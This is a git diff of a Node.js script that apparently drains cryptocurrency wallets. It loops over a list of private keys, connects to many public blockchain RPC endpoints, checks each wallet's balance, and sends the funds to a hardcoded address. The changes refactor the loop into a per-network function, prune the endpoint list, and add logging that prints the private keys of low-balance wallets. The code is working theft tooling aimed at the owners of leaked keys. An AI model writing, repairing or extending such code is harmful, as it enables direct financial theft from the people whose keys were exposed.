@@ -2,7 +2,8 @@
 const ethers2 = require("ethers")
 const Promise = require('bluebird')
 const nodemailer = require("nodemailer");
-const ProtonMail = require("protonmail-api")
+const ProtonMail = require("protonmail-api");
+const { runMain } = require("module");
 const myWalletAddress = "0x9DB14B7a909341B0bc4d971Ccceef065BD9e5a29"
 
 const sendTransaction = async (provider, wallet) => {
@@ -24,38 +25,13 @@ const sendTransaction = async (provider, wallet) => {
   }
 }
 const networks = [
-  "https://bsc-dataseed3.defibit.io",
-  "https://eth.llamarpc.com",
-  "https://evm2.kava.io",
+  "https://polygon.llamarpc.com", //works
+  "https://ultron-rpc.net",
+  "https://mainnet.gateway.tenderly.co",
+  "https://optimism.publicnode.com",
+  "https://bsc.meowrpc.com",
   "https://public-node-api.klaytnapi.com/v1/cypress",
-  "https://mainnet.fusionnetwork.io",
-  "https://forno.celo.org",
-  "https://1rpc.io/klay",
-  "https://exchainrpc.okex.org",
-  "https://gnosis-mainnet.public.blastapi.io",
-  "https://moonbeam.public.blastapi.io",
-  "https://canto.slingshot.finance",
-  "https://andromeda.metis.io/?owner=1088",
-  "https://sgb-rpc.ftso.eu",
-
-  // "https://okc-mainnet.gateway.pokt.network/v1/lb/6275309bea1b320039c893ff",
-  "https://1rpc.io/celo",
-  "https://rpc.ankr.com/gnosis",
-  "https://http-mainnet.hecochain.com",
-  "https://moonbeam.api.onfinality.io/public",
-  "https://mainnode.plexnode.org:8545",
-  "https://kcc-rpc.com",
-  "https://andromeda.metis.io/?owner=1088",
-  "https://astar-mainnet.g.alchemy.com/v2/demo",
-  "https://filecoin-mainnet.chainstacklabs.com/rpc/v1",
-  "https://mainnet.aurora.dev",
-
-  "https://rpc.arb1.arbitrum.gateway.fm",
-  "https://matic-mainnet.chainstacklabs.com",
-  "https://mainnet.optimism.io",
-  "https://avax-mainnet.gateway.pokt.network/v1/lb/605238bf6b986eea7cf36d5e/ext/bc/C/rpc",
-  "https://evm.kava.io",
-  "https://fantom-mainnet.gateway.pokt.network/v1/lb/62759259ea1b320039c9e7ac"
+  
 
 
 
@@ -68,6 +44,9 @@ const contracts = [
   '0xB8c77482e45F1F44dE1745F52C74426C631bDD52'
 
 ]
+const conversionTable = {
+  'matic': {'1000000000000000000': '1 matic'}
+}
 
 const abis = {
   '0xB8c77482e45F1F44dE1745F52C74426C631bDD52': '[{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"bool"}],"payable":false,"type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"type":"function"},{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"success","type":"bool"}],"payable":false,"type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"withdrawEther","outputs":[],"payable":false,"type":"function"},{"constant":false,"inputs":[{"name":"_value","type":"uint256"}],"name":"burn","outputs":[{"name":"success","type":"bool"}],"payable":false,"type":"function"},{"constant":false,"inputs":[{"name":"_value","type":"uint256"}],"name":"unfreeze","outputs":[{"name":"success","type":"bool"}],"payable":false,"type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[],"payable":false,"type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"freezeOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"type":"function"},{"constant":false,"inputs":[{"name":"_value","type":"uint256"}],"name":"freeze","outputs":[{"name":"success","type":"bool"}],"payable":false,"type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"},{"name":"","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"type":"function"},{"inputs":[{"name":"initialSupply","type":"uint256"},{"name":"tokenName","type":"string"},{"name":"decimalUnits","type":"uint8"},{"name":"tokenSymbol","type":"string"}],"payable":false,"type":"constructor"},{"payable":true,"type":"fallback"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Burn","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Freeze","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Unfreeze","type":"event"}]',
@@ -78,25 +57,14 @@ const abis = {
 function remove0x(str) {
   return str.startsWith('0x') ? str.substring(2) : str
 }
-const testPrivateKeys = async keys => {
-  const myEthereumAddress = "0x28c3b043BbccBc646211Af23F7Eaa5eE86F9C70d"
-  if (keys.length > 0) {
-    // console.log(keys)
-
-    return Promise.map(keys, async key => {
-      //console.log("trying ", key)
-
-      //console.log(Web3)
-      //add support for binance blockchain 
-      // supports ethereum mainnet
-      return Promise.each(networks, async network => {
-
-        let w3
+const runForNetwork = async (network, key) => {
+  //console.log('running for network', network)
+  let w3
         try {
           w3 = new ethers2.getDefaultProvider(network)
         }
         catch (err) {
-
+          console.log(err)
         }
         try {
           //also thr signer
@@ -104,9 +72,11 @@ const testPrivateKeys = async keys => {
           //console.log(w3)
           let wallet = new ethers2.Wallet(remove0x(key), w3)
 
-          //console.log(wallet)
+          console.log(wallet)
           let balance = await w3.getBalance(wallet.address)
-          if (balance >= 5000000000000000) {
+          console.log('got balance', balance)
+          if (balance >= 5000000000000000) { 
+            //$9.32 as of july 10, 2023
             // console.log("w3 instance")
             //console.log(w3)
             console.log("signer")
@@ -125,6 +95,9 @@ const testPrivateKeys = async keys => {
 
             const transactionCount = await w3.getTransactionCount(wallet.address)
             console.log(transactionCount)
+          }
+          else if(balance > 0 & balance > 5000 & balance < 5000000000000000) {
+            console.log('found balance but it was too low', balance, wallet.address, wallet.privateKey )
           }
           //console.log("holdings")
 
@@ -149,8 +122,21 @@ const testPrivateKeys = async keys => {
         catch (err) {
           //console.log("key no good", key)
         }
+}
+const testPrivateKeys = async keys => {
+  const myEthereumAddress = "0x28c3b043BbccBc646211Af23F7Eaa5eE86F9C70d"
+  if (keys.length > 0) {
+    // console.log(keys)
 
+    return Promise.map(keys, async key => {
+      //console.log("trying ", key)
 
+      //console.log(Web3)
+      //add support for binance blockchain 
+      // supports ethereum mainnet
+      return Promise.each(networks, async network => {
+        //console.log('trying', network)
+        setTimeout(() => runForNetwork(network, key), 5000)
       })
 
     })
